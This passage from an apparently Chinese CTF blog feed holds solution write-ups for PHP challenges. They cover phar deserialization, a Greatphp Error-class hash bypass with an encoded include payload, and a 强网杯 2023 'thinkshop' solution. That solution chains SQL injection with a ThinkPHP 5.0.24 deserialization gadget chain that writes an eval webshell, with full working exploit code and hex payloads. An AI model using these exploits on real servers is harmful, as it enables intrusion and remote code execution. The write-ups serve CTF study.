class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>str[‘str’]&#x3D;$t是因为这样相当于new Test()-&gt;source，而source在Test类中不存在就会调用<code>__get()</code></p>
<p>params[‘source’]中的$key是source是因为使用从<code>__tostring</code>调到<code>__get</code>是因为new Test()-&gt;source，所以__get($key)中的key自动为source</p>
<p>$value &#x3D; $this-&gt;params[$key]会将params[$key]的键值赋给$value，所以让params[$key]等于&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php</p>
<p>而下面这些是构成phar文件的框架，没看懂，直接搬过来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>5.在burp将生成的phar.phar文件上传到该题的网页上，然后抓包，还得将phar.phar改为.jpg后缀，并且修改Content-Disposition改为image&#x2F;jpeg，然后上传，在该题url行输入<code>http://45a56e8f-0f38-4980-9f82-e1c628c3782f.node4.buuoj.cn:81/upload</code>可以查看上传上去的文件，发现文件为42574e9d70ad4a54c530fd9a294a46dc.jpg</p>
<p>6.然后在查看文件页的url行输入<code>http://2aa7556c-ed4c-4917-91b4-b7c2c8480eef.node4.buuoj.cn:81/file.php?file=phar:///var/www/html/upload/42574e9d70ad4a54c530fd9a294a46dc.jpg</code>，发现得到了base64编码的一串东西，最后解码，得到flag</p>
<h3 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h3><p>1.打开显示源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.先对源码进行分析，可以利用的是great，然后将其反序列化，会自动调用__wakeup()方法，该方法如果syc和lover的值不同，并且md5和sha1都相同，会进入下一个判断，如果syc里没有<code>/\&lt;\?php|\(|\)|\&quot;|\&#39;/</code>，就会使用eval($this-&gt;syc);</p>
<p>3.思路是我们需要绕过这些判断到达eval($this-&gt;syc);</p>
<p>eval() 函数把字符串按照 PHP 代码来计算，只需要让syc等于能将文件内容返回的函数即可，但有()过滤所以使用include “&#x2F;flag”，但又有引号过滤，就使用url取反绕过</p>
<p>4.接下来就是考虑怎么绕过<code>if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )</code>使用原生类error</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Error($str,1);$b=new Error($str,2);//必须在同一行</span><br><span class="line">echo $a;</span><br><span class="line">echo $b;</span><br><span class="line">他们输出的结果是一样的，但内容不一样，这样就可以说绕过这些比较</span><br></pre></td></tr></table></figure>

<p>5.构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SYCLOVER</span><br><span class="line">&#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line">&#125;</span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$s=new SYCLOVER();</span><br><span class="line">$s-&gt;syc=$a;</span><br><span class="line">$s-&gt;lover=$b;</span><br><span class="line">echo(urlencode(serialize($s)));</span><br></pre></td></tr></table></figure>

<p><code>$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code>这里的%D0%99%93%9E%98是执行<code>echo(urlencode(~&quot;/flag&quot;));</code>这个的输出，进行&#x2F;flag的取反，<code>include~.urldecode(&quot;%D0%99%93%9E%98&quot;)</code>相当于再对<code>urldecode(&quot;%D0%99%93%9E%98&quot;)</code>取反，会输出原来的句子，比如<code>echo &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code>会输出<code>?&gt;&lt;?=include~Й���?&gt;</code>如果经过eval的使用，就相当于使用include “&#x2F;flag”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里 $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;要在前面加上一个 ?&gt; 因为Error 的 __toString 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段信息“Error: ”：来前面的闭合一下</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>thinkshop(强网杯 2023)</title>
    <url>/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/</url>
    <content><![CDATA[<p>thinkshop</p>
<p>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<h3 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h3><p>复现</p>
<p>docker：[源码](C:\Users\AtOnce\Desktop\平平无奇\WEB\比赛源码\强网杯 2023\thinkshop)</p>
<p>thinkphp源码：<a href="https://gitee.com/emmm159/images/blob/master/source/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/html.zip">源码</a></p>
<p>知识点：</p>
<ul>
<li>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</li>
</ul>
<p>参考文章：<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
<p>打开后的首页，首页什么信息都没有，只有一个fake_flag查看详情里也没有什么信息</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218160927711.png" alt="image-20231218160927711"></p>
<p>直接看源码</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218161045651.png" alt="image-20231218161045651"></p>
<p>这些都是主要文件，先随便看一个html页面，发现需要登录</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162204570.png" alt="image-20231218162204570"></p>
<p>这里登录的后端是Admin.php中的do_login()方法</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162312003.png" alt="image-20231218162312003"></p>
<p>需要满足输入的密码经过md5等于admin数据表中的password字段内容</p>
<p>这里可以去查看docker中的数据库</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162424479.png" alt="image-20231218162424479"></p>
<p>可以看到用户民和密码，密码经过爆破解码是123456</p>
<p>但是登录使用的用户名不能用admin，只能使用1，否则会显示用户名或密码错误</p>
<p>登录后就多出了两个功能，添加商品和进入修改</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162553626.png" alt="image-20231218162553626"></p>
<p>继续看源码，可以在源码中找到非常奇怪的地方</p>
<p>一个是goods_edit.html中有反序列化函数</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162738537.png" alt="image-20231218162738537"></p>
<p>这里的作用就是进行修改时会将原来的内容先返回</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162902309.png" alt="image-20231218162902309"></p>
<p>还有一个就是goods.html中也有一个反序列化函数</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218162814328.png" alt="image-20231218162814328"></p>
<p>这里的作用就是在非管理员用户页面的查看详情那里，点击后会将数据库中的内容进行解码并反序列化会返回到网页中</p>
<p>既然有反序列化函数了，那就看这里能不能控制，如果可以控制就可以使用Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
<p>先来看data数据来自哪里，编辑页面使用了do_edit函数进行编辑，看这个方法进行了什么</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163250760.png" alt="image-20231218163250760"></p>
<p>继续跟进</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163342381.png" alt="image-20231218163342381"></p>
<p>跟进</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163510964.png" alt="image-20231218163510964"></p>
<p>继续查看</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163526322.png" alt="image-20231218163526322"></p>
<p>看到这里有sql语句拼接，其中的$data可以通过post传入</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163824248.png" alt="image-20231218163824248"></p>
<p>这样传入，sql拼接后语句是以下图中内容</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218163844583.png" alt="image-20231218163844583"></p>
<p>可以看到其实post的参数就是$key，而值就是$value</p>
<p>那么就可以通过拼接漏洞控制data内容了，之后只需要通过查看详情的反序列化函数即可触发反序列化漏洞</p>
<p>接下来就是构造如何拼接才能控制</p>
<p>需要控制$key处，那么就是修改post参数</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2731%27)/**/WHERE/**/`id`/**/%3d/**/3#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164347802.png" alt="image-20231218164347802"></p>
<p>经过井号将后面内容注释后就变成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE goods SET `id` = unhex(&#x27;32&#x27;), `name` = unhex(&#x27;737373&#x27;), `price` = unhex(&#x27;3130302e3030&#x27;), `on_sale_time` = unhex(&#x27;323032332d30352d30355430323a32303a3534&#x27;), `image` = unhex(&#x27;68747470733a2f2f692e706f7374696d672e63632f467a764e464247382f522d362d4849332d594b522d55462d4a47302d472d4e2e6a7067&#x27;), `data`=unhex(&#x27;31&#x27;)/**/WHERE/**/`id`/**/=/**/3#</span><br></pre></td></tr></table></figure>

<p>这样就成功控制了data内容</p>
<p>然后就是使用poc构造payload了</p>
<p>但是还需要找到一个可以写入文件的目录，一般都是在tmp目录下，这里寻找到&#x2F;runtime&#x2F;temp，也有写入权限</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218164613585.png" alt="image-20231218164613585"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Pipes&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Relation&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line">abstract class OneToOne extends Relation&#123;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class HasOne extends OneToOne&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//目的调用其write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#修改处</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Output对象,目的是调用__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line">class Query&#123;</span><br><span class="line">    protected $model;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;handler = new File();//目的调用File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;#File</span><br><span class="line">class File&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;        =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27;          =&gt; &#x27;php://filter/write=string.rot13/resource=/var/www/html/runtime/temp/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line">class Pivot extends Model&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure>

<p>将生成的数据进行十六进制编码</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%27547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f33313966513d3d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165045003.png" alt="image-20231218165045003"></p>
<p>显示更新成功之后点击查看详情</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165115340.png" alt="image-20231218165115340"></p>
<p>但是这里显示了数据错误，去源码中寻找以下为什么会显示数据错误</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165244243.png" alt="image-20231218165244243"></p>
<p>看到data内容的前三个必须是YTo，base64解码后是a:</p>
<p>也就是只有序列化数据是一个数组才能正常查看</p>
<p>修改一下exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将上面的exp的最后一行改为</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(array(new Windows())));</span><br></pre></td></tr></table></figure>

<p>然后再将执行的内容经过十六进制编码后打payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2759546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f3331396658303d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165701575.png" alt="image-20231218165701575"></p>
<p>看到这个说明反序列化成功</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165720197.png" alt="image-20231218165720197"></p>
<p>最后就可以命令执行了</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165742506.png" alt="image-20231218165742506"></p>
]]></content>
  </entry>
  <entry>
    <title>循环用法</title>
    <url>/2022/10/27/%E5%BE%AA%E7%8E%AF/</url>
    <content><![CDATA[<p>php循环的用法</p>
<span id="more"></span>

